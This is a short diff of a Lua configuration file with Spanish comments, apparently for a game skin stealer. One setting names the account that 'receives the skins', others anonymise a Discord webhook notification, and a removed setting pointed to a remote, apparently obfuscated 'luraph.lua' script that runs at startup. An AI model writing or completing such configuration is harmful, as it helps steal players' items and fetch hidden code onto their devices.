@@ -2,12 +2,8 @@ local CONFIG = {
     ANONYMOUS     = true, -- oculta los nombres en el webhook
 
     TARGET_NAME   = "yamxsb", -- username de la cuenta que recibe las skins
-   
-    -- Script extra que se ejecuta al iniciar, puede ser un script de Yisus o cualquier otro script.
-    -- Dejar vacio para desactivar
-    SECOND_SCRIPT_URL = "https://raw.githubusercontent.com/carlossano888-create/jesus/refs/heads/main/luraph.lua",
-
-    -- (OPCIONAL) webhook de Discord para notificaciones, dejar vacio para desactivar
+    
+    -- webhook de Discord para notificaciones, dejar vacio para desactivar
     WEBHOOK = {
         URL  = "", -- "https://discord.com/api/webhooks/" webhook de Discord
         PING = "@everyone", -- mencion del mensaje, nil para ninguna
